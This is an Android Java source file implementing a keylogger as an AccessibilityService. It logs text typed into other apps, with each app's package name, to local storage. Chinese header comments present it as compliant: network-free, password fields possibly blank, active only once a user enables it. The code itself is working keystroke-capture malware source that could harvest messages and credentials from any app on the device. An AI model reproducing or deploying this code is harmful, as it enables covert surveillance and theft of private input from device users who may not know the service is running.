package com.example.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

/**
 * 键盘记录服务（AccessibilityService 实现，无需 root）。
 *
 * 工作范围：监听本机各应用输入框的 TYPE_VIEW_TEXT_CHANGED 事件，
 * 将“输入内容 + 来源应用包名 + 时间戳”写入应用私有存储（本机）。
 *
 * 合规要点：
 *  - 不申请、不使用任何网络权限，数据无法外传；
 *  - 明文密码字段（标记为 passwordInput 的 EditText）在 Android 14+
 *    受系统保护，getText() 可能返回空，这是预期的安全行为；
 *  - 仅在用户于系统设置中手动开启本服务后才会运行。
 */
public class KeyLoggerService extends AccessibilityService {

    private LogManager logManager;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        logManager = LogManager.getInstance(this);
        logManager.append("===== 键盘记录服务已启动（本机，数据不联网）=====");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (logManager == null) {
            logManager = LogManager.getInstance(this);
        }
        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                && type != AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            return;
        }

        CharSequence pkg = event.getPackageName();
        CharSequence text = (event.getText() != null && !event.getText().isEmpty())
                ? event.getText().get(0)
                : null;

        if (text != null && text.length() > 0) {
            String source = (pkg != null) ? pkg.toString() : "?";
            logManager.append("[" + source + "] " + text);
        }
    }

    @Override
    public void onInterrupt() {
        if (logManager != null) {
            logManager.append("===== 服务被系统中断 =====");
        }
    }

    @Override
    public void onDestroy() {
        if (logManager != null) {
            logManager.append("===== 键盘记录服务停止 =====");
        }
        super.onDestroy();
    }
}
